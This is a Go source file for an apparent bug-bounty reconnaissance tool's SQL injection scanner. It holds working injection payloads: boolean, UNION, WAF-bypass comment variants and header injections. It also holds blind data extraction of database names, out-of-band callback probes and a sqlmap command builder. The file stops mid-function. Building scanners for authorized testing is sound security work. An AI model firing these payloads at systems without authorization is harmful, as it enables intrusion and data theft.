package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type SQLiScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewSQLiScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *SQLiScanner {
	return &SQLiScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var sqliHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   20 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// SQL error signatures — presence after a quote injection = error-based SQLi.
var sqlErrorSignatures = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*\Wmysqli?_`),
	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
	regexp.MustCompile(`(?i)check the manual that corresponds to your (MySQL|MariaDB) server version`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)pg_query\(\):`),
	regexp.MustCompile(`(?i)unterminated quoted string at or near`),
	regexp.MustCompile(`(?i)Microsoft SQL Server`),
	regexp.MustCompile(`(?i)Unclosed quotation mark after the character string`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)SQLite3?::`),
	regexp.MustCompile(`(?i)sqlite3.OperationalError`),
	regexp.MustCompile(`(?i)SQLSTATE\[`),
	// DB2, Firebird, Sybase — rarer in bug-bounty scope but zero-cost to check
	// for and previously entirely absent, so a hit on one of these engines was
	// silently invisible to error-based detection.
	regexp.MustCompile(`(?i)DB2 SQL error`),
	regexp.MustCompile(`(?i)SQLCODE[=:]\s*-\d+`),
	regexp.MustCompile(`(?i)Dynamic SQL Error`),
	regexp.MustCompile(`(?i)Firebird`),
	regexp.MustCompile(`(?i)Sybase message`),
	regexp.MustCompile(`(?i)SybSQLException`),
	// Additional driver/ORM/framework error strings sqlmap ships in its errors.xml
	// — these surface a DB error through the app's stack even when the raw engine
	// message is wrapped. Still specific enough that a match after quote injection
	// (and NOT in the baseline) is a real error-based signal, not a generic 500.
	regexp.MustCompile(`(?i)You have an error in your SQL syntax`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)com\.mysql\.jdbc\.`),
	regexp.MustCompile(`(?i)org\.postgresql\.util\.PSQLException`),
	regexp.MustCompile(`(?i)Npgsql\.`),
	regexp.MustCompile(`(?i)System\.Data\.SqlClient\.SqlException`),
	regexp.MustCompile(`(?i)System\.Data\.OleDb\.OleDbException`),
	regexp.MustCompile(`(?i)Microsoft OLE DB Provider for (?:ODBC Drivers|SQL Server)`),
	regexp.MustCompile(`(?i)\[Microsoft\]\[ODBC SQL Server Driver\]`),
	regexp.MustCompile(`(?i)quoted string not properly terminated`),
	regexp.MustCompile(`(?i)Syntax error or access violation`),
	regexp.MustCompile(`(?i)Zend_Db_(?:Statement|Adapter)_Exception`),
	regexp.MustCompile(`(?i)Doctrine\\DBAL`),
	regexp.MustCompile(`(?i)SQLSTATE\[\w+\]\s*\[\d+\]`),
	regexp.MustCompile(`(?i)PDOException`),
}

// SQLi-prone parameter names — these carry DB lookups far more often than others.
// Curated from real-world SQLi reports (HackerOne/Exploit-DB): the names that most
// often map straight onto a WHERE clause, ORDER BY, LIMIT/OFFSET, or a lookup key.
var sqliProneParams = map[string]bool{
	"id": true, "uid": true, "user": true, "userid": true, "user_id": true,
	"page": true, "pid": true, "p": true, "cat": true, "category": true,
	"catid": true, "item": true, "itemid": true, "product": true, "prod": true,
	"pro_id": true, "order": true, "orderby": true, "order_by": true, "sort": true,
	"sort_by": true, "sortby": true, "dir": true, "num": true,
	"no": true, "key": true, "year": true, "month": true, "day": true,
	"offset": true, "limit": true, "start": true, "gid": true, "aid": true,
	"cid": true, "sid": true, "ref": true, "news": true, "article": true,
	"articleid": true, "post": true, "postid": true, "view": true, "select": true,
	"where": true, "search": true, "query": true, "q": true, "type": true,
	// ORDER BY / column-name sinks (string-context SQLi — the injection sits in the
	// ORDER BY or a column list, not a numeric WHERE; a very common real finding).
	"column": true, "col": true, "field": true, "group": true, "groupby": true,
	"having": true, "table": true, "row": true, "record": true,
	// Lookup keys that resolve to a single DB row.
	"doc": true, "docid": true, "document": true, "file_id": true, "fileid": true,
	"report": true, "report_id": true, "reportid": true, "invoice": true,
	"invoice_id": true, "txn": true, "transaction": true, "transaction_id": true,
	"payment_id": true, "coupon": true, "promo": true, "voucher": true,
	"store": true, "store_id": true, "shop": true, "branch": true, "city_id": true,
	"region_id": true, "country_id": true, "parent": true, "parent_id": true,
	"node": true, "node_id": true, "slug": true, "code": true, "sku": true,
	"serial": true, "ticket": true, "ticket_id": true, "msgid": true,
	"message_id": true, "thread": true, "thread_id": true, "comment_id": true,
	"tag_id": true, "album_id": true, "photo_id": true, "video_id": true,
	"media_id": true, "event_id": true, "booking": true, "booking_id": true,
	"reservation": true, "order_id": true, "orderid": true, "customer_id": true,
	"account_id": true, "profile_id": true, "group_id": true, "role_id": true,
}

const sqliMaxParams = 200 // hard cap so scan time stays bounded

// Value-shape signatures for DB-lookup-like GET parameters (see selectCandidates).
var (
	reLookupUUID   = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	reLookupDate   = regexp.MustCompile(`^\d{4}[-/.]\d{1,2}[-/.]\d{1,2}$`)
	reLookupHexID  = regexp.MustCompile(`(?i)^[0-9a-f]{6,32}$`) // hex row id / short hash
	reLookupNumSep = regexp.MustCompile(`^\d+[,;:|_-]\d+`)      // composite key: 12-34, 5,6
)

// looksLikeDBLookup reports whether a GET value has the SHAPE of a database lookup
// key even though its name isn't in the prone list and it isn't a bare integer.
// Deliberately narrow (UUID / date / hex id / composite numeric) so free-text
// search terms and language/format flags don't balloon the SQLi candidate set —
// the detection itself is control-based and precise regardless, but keeping the
// candidate set targeted keeps the scan fast.
func looksLikeDBLookup(val string) bool {
	v := strings.TrimSpace(val)
	if v == "" || len(v) > 64 {
		return false
	}
	return reLookupUUID.MatchString(v) || reLookupDate.MatchString(v) ||
		reLookupHexID.MatchString(v) || reLookupNumSep.MatchString(v)
}

// Run performs fast, targeted SQLi checks: only numeric / SQLi-prone GET params,
// plus Cookie and User-Agent header injection on a sample of live hosts.
// Deterministic tests per candidate (error-based + boolean/content + arithmetic),
// plus out-of-band blind SQLi. No time-based verdicts. Then move on.
func (s *SQLiScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "sqli", "Starting targeted SQLi checks (numeric/prone GET params + headers)...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "sqli", fmt.Sprintf("Selected %d high-value insertion points for SQLi testing", len(candidates)))
	auth := loadAuthHeaders(ctx, s.db, targetID)

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64
	var flaggedMu sync.Mutex
	flagged := make(map[string]bool)

	for _, ip := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			if kind, ev := s.quickProbe(ctx, ip, auth); kind != "" {
				s.store(targetID, "sqli", "high", ip.URL, ip.Param, kind, ev+" ["+ip.Method+"]")
				found.Add(1)
				flaggedMu.Lock()
				flagged[ip.URL+"|"+ip.Param] = true
				flaggedMu.Unlock()
				logFn("warn", "sqli", fmt.Sprintf("SQLi (%s): %s param=%s [%s]", kind, ip.URL, ip.Param, ip.Method))
				s.notify(targetID, ip.URL, ip.Param)
			}
		}(ip)
	}
	wg.Wait()

	// STATISTICAL TIME-BASED pass (bounded). Runs on candidates the deterministic
	// pass did NOT already flag. It never trusts a single timer: it proves a
	// server-side SLEEP by requiring the delay to scale linearly with the injected
	// sleep (see sqli_timing.go). Low concurrency because each confirmation holds a
	// connection for several seconds; capped so the heavy stage stays bounded.
	s.timeBasedPass(ctx, targetID, candidates, flagged, auth, &found, logFn)

	// Second-order (stored) SQLi: plant a stored error-force payload through write
	// (POST/body) params, then re-read the target's pages for a delayed marker leak
	// — an injection whose sink runs on a later, different request.
	s.secondOrderChecks(ctx, targetID, candidates, auth, &found, logFn)

	// Header-based (Cookie / User-Agent) on a small sample of live hosts.
	s.headerChecks(ctx, targetID, logFn, &found)

	// Blind (out-of-band) SQLi — the SQLi objective OWNS its blind confirmation via
	// the shared OOB capability: DB functions that make the SERVER itself reach our
	// host (Oracle UTL_HTTP/HTTPURITYPE, MSSQL xp_dirtree UNC, …) prove injection
	// with ZERO visible response signal — the error/boolean/time paths above can all
	// miss behind a WAF or on a stored query. A callback is reported as a blind_sqli
	// finding via RecordOOBHit. No-op without a configured callback URL.
	s.plantBlindSQLi(ctx, targetID, logFn)

	logFn("info", "sqli", fmt.Sprintf("SQLi check done. Found %d candidates.", found.Load()))
	return nil
}

// plantBlindSQLi plants out-of-band SQLi payloads across every insertion point,
// each registered under its own token so a later callback attributes to blind_sqli.
func (s *SQLiScanner) plantBlindSQLi(ctx context.Context, targetID string, logFn LogFunc) {
	o, ok := newOOBCapability(s.cfg)
	if !ok {
		return
	}
	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
	if len(points) == 0 {
		return
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)
	n := o.plantClass(ctx, s.db, targetID, points, auth, "sqli",
		nil, // OOB SQL functions are tried on every param, as before
		func(cb string) []string { return sqliOOBPayloads(cb, o.callbackHost) })
	if n > 0 {
		logFn("info", "sqli", fmt.Sprintf("Planted %d blind-SQLi OOB probe(s); execution reported via callback.", n))
	}
}

// selectCandidates keeps only numeric-valued or SQLi-prone-named params (GET
// query or POST form), deduped, capped for speed.
func (s *SQLiScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
	rows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url, parameter, value, COALESCE(method,'GET'), COALESCE(content_type,''), COALESCE(location,'query')
		FROM parameters WHERE target_id = ?
	`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	numeric := regexp.MustCompile(`^\d+$`)
	seen := make(map[string]bool)
	// Stock WordPress/Joomla/Drupal hosts: skip active SQLi — the core is patched
	// and blindly fuzzing it is a false-positive magnet (nuclei's CMS templates
	// still cover the real known-CVE surface).
	cmsSkip := loadCMSSkipHosts(s.db, targetID)
	var out []insertionPoint
	for rows.Next() {
		var ip insertionPoint
		var val string
		if err := rows.Scan(&ip.URL, &ip.Param, &val, &ip.Method, &ip.ContentType, &ip.Location); err != nil {
			continue
		}
		if hostSkippedByCMS(ip.URL, cmsSkip) {
			continue
		}
		lname := strings.ToLower(ip.Param)
		// POST/form fields are always worth testing; GET only if the value is
		// numeric, the name is SQLi-prone, OR the value has the SHAPE of a DB lookup
		// key (UUID, date, hex id, composite numeric). That last class is where a lot
		// of real-world SQLi hides — e.g. ?ref=2024-01-02 or ?token=deadbeef feeding
		// a WHERE clause — and a name/numeric-only filter walks right past it.
		if ip.Method != "POST" && !numeric.MatchString(strings.TrimSpace(val)) &&
			!sqliProneParams[lname] && !looksLikeDBLookup(val) {
			continue
		}
		parsed, err := url.Parse(ip.URL)
		if err != nil {
			continue
		}
		key := ip.Method + parsed.Host + parsed.Path + "?" + ip.Param + "|" + ip.Location
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, ip)
		if len(out) >= sqliMaxParams {
			break
		}
	}
	return out
}

// quickProbe: error-based + blind boolean/content + arithmetic differential,
// each reproduced before it counts. Fast and precise — deterministic signals
// only; no time-based verdicts (blind SQLi is proven out-of-band elsewhere).
func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string) {
	// Error-based: baseline vs quote-injected.
	base, _ := sendInjected(ctx, sqliHTTPClient, ip, "1", auth)
	errResp, _ := sendInjected(ctx, sqliHTTPClient, ip, "1'\"`", auth)
	for _, sig := range sqlErrorSignatures {
		if !sig.MatchString(errResp) || sig.MatchString(base) {
			continue
		}
		// FP guard 1: a WAF/challenge page is often served ONLY for the quote-bearing
		// payload and can carry SQL-ish text — that is a block, not a DB error. (The
		// benign "1" baseline passes the WAF, so the naive differential fires.)
		if bodyLooksLikeWAFBlock(errResp) {
			break
		}
		// FP guard 2: reproduce. A transient 500 (unrelated load, a flaky upstream)
		// can flash a DB error exactly once. Require the SAME signature on a second
		// injection AND still absent from a fresh baseline before trusting it.
		base2, _ := sendInjected(ctx, sqliHTTPClient, ip, "1", auth)
		errResp2, _ := sendInjected(ctx, sqliHTTPClient, ip, "1'\"`", auth)
		if !sig.MatchString(errResp2) || sig.MatchString(base2) {
			break
		}
		{
			evidence := "DB error triggered by quote injection (reproduced; absent from baseline)"
			if dbms := fingerprintDBMS(errResp); dbms != "" {
				evidence += " — engine: " + dbms
			}
			// UNION enrichment — ONLY runs on a parameter already PROVEN
			// vulnerable above, so it can never introduce a new false
			// positive; it just turns "an error appeared" into "here is the
			// exact column count and a UNION SELECT PoC that reflects a
			// marker in the response", a much stronger report artifact.
			if cols := s.unionColumnCount(ctx, ip, auth); cols > 0 {
				if pos, payload := s.unionMarkerColumn(ctx, ip, auth, cols); pos > 0 {
					evidence = fmt.Sprintf("%s; UNION-based PROVEN: %d column(s), marker reflects in column %d — PoC: %s",
						evidence, cols, pos, payload)
				} else {
					evidence = fmt.Sprintf("%s; UNION column count likely %d (marker reflection not confirmed — output may not be rendered directly)",
						evidence, cols)
				}
			}
			return "error_based", evidence
		}
	}

	// DBMS-adaptive error-FORCED extraction (item 2): make the engine raise an
	// error carrying a value it computed for us (unique marker + version). For
	// MySQL the marker is sent as a hex literal, so an ASCII match is proof the DB
	// evaluated it — reflection-proof. Runs with WAF-bypass tampering. This catches
	// injections that don't error on a bare quote but DO on a type-cast/subquery.
	if kind, ev := s.errorForceProbe(ctx, ip, auth, base); kind != "" {
		return kind, ev
	}

	// Boolean-based (blind): a TRUE condition must yield ~the baseline response
	// while a FALSE condition changes it. Catches injections that never error or
	// sleep. Low-FP: TRUE must match baseline AND FALSE must differ from TRUE by a
	// real margin, and it must reproduce.
	baseLen := len(base)
	// Adaptive thresholds: measure THIS endpoint's own response-size noise floor
	// and scale the "meaningful difference" bar off it instead of fixed 48/200
	// constants — a dynamic page that wobbles hundreds of bytes on its own no
	// longer trips the boolean differential. Also a WAF gate: if the benign
	// baseline itself is a block/challenge page, boolean testing is meaningless.
	vol := measureVolatility(ctx, sqliHTTPClient, ip, auth, "1")
	if vol.blocked {
		return "", ""
	}

	// Length-based boolean/arithmetic differential is only trustworthy on a page
	// whose size is STABLE and NOT truncated. Huge, highly-dynamic pages — e.g. a
	// marketplace product page with rotating recommendations — wobble by hundreds
	// of KB between IDENTICAL requests and exceed the response read cap, so every
	// response comes back the same truncated size (or wildly different for a reason
	// that has nothing to do with SQL). That turns any TRUE/FALSE size delta into
	// pure noise: the #1 source of blind-boolean false positives (the basalam-style
	// FPs). Bail out of length-differential testing for such endpoints — error- and
	// error-based detection is unaffected because it does not rely on response size.
	const sqliBodyCap = 512 * 1024
	booleanReliable := baseLen > 0 && baseLen < sqliBodyCap && vol.valid &&
		vol.baseLen < sqliBodyCap &&
		(vol.baseLen == 0 || vol.noise <= vol.baseLen/8) && vol.noise <= 20000

	if booleanReliable {
		// mkSQLmapCmd builds a copy-pasteable sqlmap PoC for the report evidence.
		mkSQLmapCmd := func() string {
			return fmt.Sprintf("sqlmap -u '%s' -p %s --batch --technique=B", ip.URL, ip.Param)
		}
		// Each pair carries a condFmt that wraps an arbitrary boolean SQL condition in
		// the SAME injection syntax the TRUE/FALSE pair proved (one %s). A detected
		// differential is only reported after blindExtractDBName USES that oracle to
		// read the current database name — a bare differential (CDN/id→object
		// endpoints) extracts nothing and is dropped as a false positive.
		type bpair struct{ tru, fls, condFmt string }
		for _, pair := range []bpair{
			{"1 AND 1=1", "1 AND 1=2", "1 AND (%s)"},
			{"1' AND '1'='1", "1' AND '1'='2", "1' AND (%s) AND '1'='1"},
			{"1 AND 1=1-- -", "1 AND 1=2-- -", "1 AND (%s)-- -"},
			{`1" AND "1"="1`, `1" AND "1"="2`, `1" AND (%s) AND "1"="1`},
			// Parenthesis boundaries (query wraps the value in parens) — sqlmap's
			// boundary set. Catches WHERE (id=$p) / functions like IN($p).
			{"1) AND (1=1)-- -", "1) AND (1=2)-- -", "1) AND (%s)-- -"},
			{"1)) AND ((1=1))-- -", "1)) AND ((1=2))-- -", "1)) AND (%s)-- -"},
			{"1') AND ('1'='1", "1') AND ('1'='2", "1') AND (%s) AND ('1'='1"},
			// Inline-comment + mixed-case keyword-filter bypass: a WAF/blocklist that
			// drops the literal "AND 1=1" often still lets "/**/aNd/**/1=1" through,
			// so an injection sitting behind such a filter is invisible to the plain
			// pairs above but caught here — a common real-world WAF-bypass SQLi.
			{"1/**/aNd/**/1=1", "1/**/aNd/**/1=2", "1/**/aNd/**/(%s)"},
			{"1'/**/aNd/**/'1'='1", "1'/**/aNd/**/'1'='2", "1'/**/aNd/**/(%s)/**/aNd/**/'1'='1"},
		} {
			tResp, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
			fResp, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
			if len(tResp) == 0 || len(fResp) == 0 {
				continue
			}
			// If either response hit the read cap it's truncated → size is unreliable.
			if len(tResp) >= sqliBodyCap || len(fResp) >= sqliBodyCap {
				continue
			}
			// A block/challenge page carries a per-request id → its size wobbles like a
			// real boolean signal. Never derive a finding from one.
			if bodyLooksLikeWAFBlock(tResp) || bodyLooksLikeWAFBlock(fResp) {
				continue
			}
			// Require: TRUE ~ baseline, FALSE differs from BOTH the TRUE response AND
			// the baseline (a parameter that merely changes the page on any value would
			// only satisfy the first).
			trueLikeBase := vol.matchesBaseline(len(tResp))
			falseDiffers := abs(len(tResp)-len(fResp)) > vol.sigDiff(200) &&
				abs(len(fResp)-baseLen) > vol.sigDiff(200)
			if trueLikeBase && falseDiffers {
				// Confirm: repeat once, and check the pattern holds (guards dynamic pages).
				t2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
				f2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
				if abs(len(t2)-len(f2)) > vol.sigDiff(200) && vol.matchesBaseline(len(t2)) &&
					abs(len(f2)-baseLen) > vol.sigDiff(200) {
					// PROVE it: use the oracle to extract the current database name. A bare
					// size differential that cannot extract is NOT reported (it is the
					// dominant blind-boolean false positive).
					isTrueLike := func(r []byte) bool { return vol.matchesBaseline(len(r)) }
					if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
						return "boolean_based", fmt.Sprintf(
							"blind boolean SQLi on param %q — PROVEN by extraction: current database = %q (%s). TRUE payload %q → %dB (~baseline %dB); FALSE payload %q → %dB (differs). Endpoint noise floor %dB. Verify: %s",
							ip.Param, name, dbms, pair.tru, len(tResp), baseLen, pair.fls, len(fResp), vol.noise, mkSQLmapCmd())
					}
				}
			}

			// CONTENT differential — catches the boolean SQLi the SIZE check MISSES:
			// a TRUE/FALSE pair whose responses are the SAME LENGTH but DIFFERENT
			// CONTENT (a full record vs a "not found" page that happen to be equal
			// size, a swapped equal-length status label, etc.). Requires TRUE to be the
			// SAME object as the baseline (the '1' row) AND FALSE to render a
			// materially different one — the same bar IDOR uses (bodiesSameObject:
			// exact / near-length + volatile-field blurring + chunk comparison). This
			// is FP-safe: a reflected payload makes TRUE differ from the baseline (so
			// it fails the TRUE~baseline test), and an inert parameter makes FALSE ==
			// baseline (so it fails the FALSE-differs test). Reproduced once, and gated
			// by the stable-page precondition (booleanReliable) so a dynamic page
			// cannot trip it.
			if bodiesSameObject(base, tResp) && !bodiesSameObject(base, fResp) {
				t2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
				f2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
				if bodiesSameObject(base, t2) && !bodiesSameObject(base, f2) {
					// PROVE it via extraction through the object-identity oracle. This is the
					// path that used to FP on CDN/id→object endpoints (the aparat.com report):
					// they render different objects for different ids but expose no SQL, so
					// extraction fails and no finding is emitted.
					isTrueLike := func(r []byte) bool { return bodiesSameObject(base, string(r)) }
					if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
						return "boolean_based", fmt.Sprintf(
							"blind boolean SQLi on param %q (content-differential oracle) — PROVEN by extraction: current database = %q (%s). TRUE payload %q renders the baseline object while FALSE %q renders a different one, and the oracle exfiltrated the DB name. Verify: %s",
							ip.Param, name, dbms, pair.tru, pair.fls, mkSQLmapCmd())
					}
				}
			}
		}

		// Arithmetic differential (sqlmap-style): our injected base is "1". "2-1"
		// evaluates to 1 inside the SQL query, so it must behave like the baseline;
		// "3-1" evaluates to 2 (a different row), so it must differ. A NON-injectable
		// parameter treats "2-1" as the literal string "2-1", so both differ from the
		// "1" baseline and nothing matches. Catches numeric-context injections that
		// never error or sleep and that reject the AND/OR keywords a WAF/keyword
		// filter blocks — a classic real-world SQLi a keyword-only check misses.
		eq, _ := sendInjected(ctx, sqliHTTPClient, ip, "2-1", auth)  // = 1
		dif, _ := sendInjected(ctx, sqliHTTPClient, ip, "3-1", auth) // = 2
		if len(eq) > 0 && len(dif) > 0 && len(eq) < sqliBodyCap && len(dif) < sqliBodyCap &&
			!bodyLooksLikeWAFBlock(eq) && !bodyLooksLikeWAFBlock(dif) &&
			vol.matchesBaseline(len(eq)) && abs(len(eq)-len(dif)) > vol.sigDiff(200) &&
			abs(len(dif)-baseLen) > vol.sigDiff(200) {
			// Reproduce with different operands to rule out a dynamic page.
			eq2, _ := sendInjected(ctx, sqliHTTPClient, ip, "4-3", auth)  // = 1
			dif2, _ := sendInjected(ctx, sqliHTTPClient, ip, "5-3", auth) // = 2
			if vol.matchesBaseline(len(eq2)) && abs(len(eq2)-len(dif2)) > vol.sigDiff(200) {
				// Numeric context: prove it by extracting the DB name through an AND oracle.
				// If the endpoint merely evaluates arithmetic for some non-SQL reason, the
				// extraction fails and nothing is reported.
				isTrueLike := func(r []byte) bool { return vol.matchesBaseline(len(r)) }
				if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, "1 AND (%s)", isTrueLike); ok {
					return "boolean_based", fmt.Sprintf(
						"arithmetic-differential SQLi on param %q — PROVEN by extraction: current database = %q (%s). '2-1'(=1) matched baseline (%dB) while '3-1'(=2) → %dB differed — the value is evaluated inside the query. Verify: %s",
						ip.Param, name, dbms, baseLen, len(dif), mkSQLmapCmd())
				}
			}
		}
	}

	// Time-based detection was removed: SLEEP/WAITFOR/pg_sleep timing verdicts
	// are FP-prone on slow, tarpitting, or WAF-throttled endpoints. Blind SQLi
	// with no error/boolean signal is now proven ONLY out-of-band (plantBlindSQLi
	// below), where the database itself calls back to our listener — deterministic
	// and free of timing false positives.
	return "", ""
}

// unionColumnCount finds the query's column count via ascending ORDER BY N:
// the first N that triggers a DB error means the real query has N-1 columns.
// Bounded to 20 columns (20 extra requests, worst case) and only ever called
// on an injection point ALREADY confirmed error-based-vulnerable — this is
// pure evidence enrichment, not a new detection surface.
func (s *SQLiScanner) unionColumnCount(ctx context.Context, ip insertionPoint, auth map[string]string) int {
	const maxCols = 20
	for n := 1; n <= maxCols; n++ {
		resp, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf("1 ORDER BY %d-- -", n), auth)
		if resp == "" {
			return 0
		}
		for _, sig := range sqlErrorSignatures {
			if sig.MatchString(resp) {
				return n - 1 // first N that errors → the query has N-1 real columns
			}
		}
	}
	return 0 // no boundary found within maxCols — give up quietly, no guess
}

// unionMarkerColumn tries a UNION SELECT with a unique marker string placed
// in each column position (others NULL) and reports the first position whose
// marker shows up verbatim in the response body — concrete, reproducible
// proof of UNION-based exploitability, not just "an error appeared".
func (s *SQLiScanner) unionMarkerColumn(ctx context.Context, ip insertionPoint, auth map[string]string, cols int) (int, string) {
	if cols <= 0 || cols > 20 {
		return 0, ""
	}
	marker := "rcnUNI0N" + uuid.New().String()[:8]
	for pos := 1; pos <= cols; pos++ {
		vals := make([]string, cols)
		for i := range vals {
			if i+1 == pos {
				vals[i] = "'" + marker + "'"
			} else {
				vals[i] = "NULL"
			}
		}
		payload := fmt.Sprintf("-1 UNION SELECT %s-- -", strings.Join(vals, ","))
		resp, _ := sendInjected(ctx, sqliHTTPClient, ip, payload, auth)
		if strings.Contains(resp, marker) {
			return pos, payload
		}
	}
	return 0, ""
}

// headerChecks injects SQL payloads into Cookie and User-Agent on a small
// sample of live hosts (these are common, often-missed SQLi vectors).
func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn LogFunc, found *atomic.Int64) {
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT 40
	`, targetID)
	if err != nil {
		return
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = filterURLsByHostScope(ctx, urls)
	if len(urls) == 0 {
		return
	}
	logFn("info", "sqli", fmt.Sprintf("Testing Cookie/User-Agent SQLi on %d hosts...", len(urls)))

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	for _, u := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			// Cookie + User-Agent are classic, but X-Forwarded-For and Referer are
			// just as commonly logged/queried server-side while being assumed
			// "trusted" — a frequent real-world SQLi vector (hunt-sqli root cause
			// #9: HTTP headers stored in the DB without sanitisation).
			for _, hdr := range []string{"Cookie", "User-Agent", "X-Forwarded-For", "Referer"} {
				if kind, ev := s.headerProbe(ctx, target, hdr); kind != "" {
					val := "id=INJECT"
					switch hdr {
					case "User-Agent":
						val = "UA-INJECT"
					case "X-Forwarded-For":
						val = "127.0.0.1,INJECT"
					case "Referer":
						val = "https://INJECT/"
					}
					s.store(targetID, "sqli", "high", target, hdr+" header", kind, ev+" (via "+hdr+" header: "+val+")")
					found.Add(1)
					logFn("warn", "sqli", fmt.Sprintf("Header SQLi (%s) via %s: %s", kind, hdr, target))
					s.notify(targetID, target, hdr)
				}
			}
		}(u)
	}
	wg.Wait()
}

func (s *SQLiScanner) headerProbe(ctx context.Context, target, header string) (string, string) {
	// error-based (same FP guards as the parameter path: not a WAF block, and it
	// must reproduce while staying absent from a fresh baseline).
	base := s.fetchWithHeader(ctx, target, header, "recon-baseline")
	errResp := s.fetchWithHeader(ctx, target, header, "recon'\"`")
	for _, sig := range sqlErrorSignatures {
		if !sig.MatchString(errResp) || sig.MatchString(base) {
			continue
		}
		if bodyLooksLikeWAFBlock(errResp) {
			break
		}
		base2 := s.fetchWithHeader(ctx, target, header, "recon-baseline")
		errResp2 := s.fetchWithHeader(ctx, target, header, "recon'\"`")
		if !sig.MatchString(errResp2) || sig.MatchString(base2) {
			break
		}
		return "error_based", "DB error triggered by quote in header (reproduced; absent from baseline)"
	}
	// Header SQLi is now reported only on a reproduced DB error. Time-based header
	// probing was removed alongside the parameter path — it was the same FP-prone
	// timing signal on slow/throttled endpoints.
	return "", ""
}

func (s *SQLiScanner) fetchWithHeader(ctx context.Context, target, header, injection string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", target, nil)
	if err != nil {
		return ""
	}
	// A default UA so non-UA header tests still send a normal-looking request.
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
	switch header {
	case "Cookie":
		req.Header.Set("Cookie", "id="+injection)
	case "User-Agent":
		req.Header.Set("User-Agent", injection)
	case "X-Forwarded-For":
		// Wrap so the on-the-wire value matches the evidence string in headerChecks.
		req.Header.Set("X-Forwarded-For", "127.0.0.1,"+injection)
	case "Referer":
		req.Header.Set("Referer", "https://"+injection+"/")
	default:
		req.Header.Set(header, injection)
	}
	resp, err := sqliHTTPClient.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	resp.Body.Close()
	return string(body)
}

func (s *SQLiScanner) store(targetID, vulnType, severity, rawURL, param, kind, evidence string) {
	// Confidence reflects HOW the SQLi was proven: an error message or a
	// reproduced 5s time-delay is near-certain; a boolean length-diff is strong
	// but heuristic (kept as a high candidate until re-verified).
	conf := 85
	switch kind {
	case "error_based":
		conf = 92
	case "time_based":
		conf = 90
	case "boolean_based":
		conf = 85
	}
	status := StatusFinding
	if conf < ConfEvidence {
		status = StatusCandidate
	}
	id := uuid.New().String()
	_, _ = s.db.Exec(`
		INSERT INTO vuln_findings (id, target_id, type, severity, url, parameter, payload, evidence, confidence, status)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(target_id, type, url, parameter) DO UPDATE SET
			severity = excluded.severity,
			payload = excluded.payload,
			evidence = excluded.evidence,
			confidence = excluded.confidence,
			status = excluded.status
	`, id, targetID, vulnType, severity, rawURL, param, kind, evidence, conf, status)

